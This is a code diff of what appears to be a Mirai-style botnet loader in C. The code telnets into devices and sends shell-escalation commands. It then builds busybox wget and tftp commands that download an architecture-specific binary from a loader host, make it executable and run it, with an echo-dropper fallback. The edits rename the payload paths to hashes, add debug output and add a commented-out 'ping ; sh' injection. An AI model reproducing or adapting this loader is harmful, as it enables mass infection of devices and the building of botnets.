@@ -36,6 +36,9 @@ struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, u
     srv->workers = calloc(threads, sizeof(struct server_worker));
     srv->workers_len = threads;
 
+    #ifdef DEBUG
+        printf("max open %d, wget addr %s:%d, tftp addr %s\n", srv->max_open, srv->wget_host_ip, srv->wget_host_port, srv->tftp_host_ip);
+    #endif
 
     if(srv->estab_conns == NULL)
     {
@@ -72,6 +75,9 @@ struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, u
         pthread_create(&wrker->thread, NULL, worker, wrker);
     }
 
+    #ifdef DEBUG
+        printf("calling timeout thread\n");
+    #endif
 
     pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);
 
@@ -121,7 +127,6 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     {
         if(time(NULL) % 10 == 0)
         {
-           // printf("Failed to open and bind socket\n");
         }
         ATOMIC_DEC(&srv->curr_open);
         return;
@@ -251,7 +256,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 
     if(!conn->open)
     {
-       // printf("socket not open! conn->fd: %d, fd: %d, events: %08x, state: %08x\n", conn->fd, ev->data.fd, ev->events, conn->state_telnet);
+        printf("socket not open! conn->fd: %d, fd: %d, events: %08x, state: %08x\n", conn->fd, ev->data.fd, ev->events, conn->state_telnet);
     }
 
     if(ev->events & EPOLLIN && conn->open)
@@ -318,6 +323,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             util_sockprintf(conn->fd, "enable\r\n");
                             util_sockprintf(conn->fd, "system\r\n");
                             util_sockprintf(conn->fd, "shell\r\n");
+//                            util_sockprintf(conn->fd, "ping ; sh\r\n");
                             util_sockprintf(conn->fd, "sh\r\n");
                             ATOMIC_INC(&wrker->srv->total_logins);
                             conn->state_telnet = TELNET_READ_WRITEABLE;
@@ -325,7 +331,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         break;
                     case TELNET_READ_WRITEABLE:
                         for(j = 0; j < 13; j++)
-                            util_sockprintf(conn->fd, ">%s.ptmx && cd %s\r\n", tmp_dirs[j], tmp_dirs[j]);
+                        util_sockprintf(conn->fd, ">%s.ptmx && cd %s\r\n", tmp_dirs[j], tmp_dirs[j]);
                         util_sockprintf(conn->fd, "/bin/busybox rm -rf %s %s\r\n", FN_BINARY, FN_DROPPER);
                         util_sockprintf(conn->fd, "/bin/busybox cp /bin/busybox " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                         conn->state_telnet = TELNET_COPY_ECHO;
@@ -424,8 +430,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_WGET:
                                     conn->state_telnet = TELNET_UPLOAD_WGET;
                                     conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
-                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "dano", conn->info.arch);
+                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, conn->info.arch);
                                     #ifdef DEBUG
                                         printf("wget\n");
                                     #endif
@@ -433,8 +439,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 				                case UPLOAD_TFTP:
                                     conn->state_telnet = TELNET_UPLOAD_TFTP;
                                     conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
-                                                    FN_BINARY, "dano", conn->info.arch, wrker->srv->tftp_host_ip);
+                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r db0fa4b8db0333367e9bda3ab68b8042.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                                    FN_BINARY, conn->info.arch, wrker->srv->tftp_host_ip);
 				    				#ifdef DEBUG
                                     	printf("tftp\n");
 			 	    				#endif
@@ -448,10 +454,13 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
                             conn->timeout = 45;
+                            #ifdef DEBUG
+                                printf("[FD%d] Finished echo loading!\n", conn->fd);
+                            #endif
                             if(strncmp(conn->info.arch, "arc", 3) == 0)
-                                util_sockprintf(conn->fd, "./%s %s.echo; " EXEC_QUERY "\r\n", FN_DROPPER, conn->info.arch);
+                                util_sockprintf(conn->fd, "./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, id_tag, conn->info.arch);
                             else
-                                util_sockprintf(conn->fd, "./%s > %s; ./%s %s.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, FN_BINARY, id_tag);
+                                util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_echoes);
                         }
                         break;
@@ -461,11 +470,17 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
                             conn->timeout = 45;
-                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.wget; " EXEC_QUERY "\r\n", id_tag);
+                            #ifdef DEBUG
+                                printf("[FD%d] Finished wget loading\n", conn->fd);
+                            #endif
+                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_wgets);
                         }
                         else if(consumed < -1)
                         {
+                            #ifdef DEBUG
+                                printf("[FD%d] No permission to WGET load, falling back to echo!\n", conn->fd);
+                            #endif
                             consumed *= -1;
                             conn->state_telnet = TELNET_UPLOAD_ECHO;
                             conn->info.upload_method = UPLOAD_ECHO;
@@ -488,7 +503,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 			    			#ifdef DEBUG
                             	printf("[FD%d] Finished tftp loading\n", conn->fd);
 			    			#endif
-                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.tftp; " EXEC_QUERY "\r\n", id_tag);
+                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_tftps);
                         }
                         else if(consumed < -1) // Did not have permission to TFTP
